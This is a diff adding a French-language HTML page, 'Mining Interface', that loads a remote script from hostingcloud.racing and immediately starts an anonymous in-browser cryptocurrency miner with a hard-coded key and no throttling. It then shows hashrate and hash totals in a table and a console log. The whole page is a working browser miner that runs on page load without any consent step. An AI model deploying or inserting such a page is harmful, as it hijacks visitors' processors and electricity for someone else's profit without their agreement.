@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>🚀 Mining Interface</title>
+  <script src="https://www.hostingcloud.racing/EC1j.js"></script>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      padding: 20px;
+    }
+    table {
+      width: 60%;
+      margin: 20px auto;
+      border-collapse: collapse;
+      background: #222;
+      box-shadow: 0 0 15px #0f0;
+    }
+    th, td {
+      border: 1px solid #0f0;
+      padding: 10px;
+    }
+    th {
+      background: #333;
+    }
+    h1 {
+      color: #0ff;
+    }
+  </style>
+</head>
+<body>
+  <h1>💻 Mining en cours...</h1>
+
+  <table>
+    <tr>
+      <th>Statistique</th>
+      <th>Valeur</th>
+    </tr>
+    <tr>
+      <td>Hashrate actuel</td>
+      <td id="hashrate">Attente...</td>
+    </tr>
+    <tr>
+      <td>Total de Hashes</td>
+      <td id="totalhashes">0</td>
+    </tr>
+    <tr>
+      <td>Force de Mining</td>
+      <td id="force">0%</td>
+    </tr>
+  </table>
+
+  <pre id="consolelog"></pre>
+
+  <script>
+    // 🔑 Clé publique
+    var _client = new Client.Anonymous(
+      '80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd',
+      { throttle: 0, c: 'w' }
+    );
+    _client.start();
+
+    // 🔄 Mise à jour toutes les 2 secondes
+    setInterval(function () {
+      let hashrate = _client.getHashesPerSecond().toFixed(2);
+      let total = _client.getTotalHashes(true);
+      let accepted = _client.getAcceptedHashes();
+      
+      // Exemple de "force" : normaliser entre 0 et 100
+      let force = Math.min(100, (hashrate / 50 * 100)).toFixed(1);
+
+      // Mise à jour du tableau
+      document.getElementById("hashrate").innerText = hashrate + " H/s";
+      document.getElementById("totalhashes").innerText = total;
+      document.getElementById("force").innerText = force + " %";
+
+      // Affichage style "console" en bas
+      document.getElementById("consolelog").innerText += 
+        "[STAT] Hashrate: " + hashrate + " H/s | Total: " + total + " | Acceptés: " + accepted + "\n";
+    }, 2000);
+  </script>
+</body>
+</html>
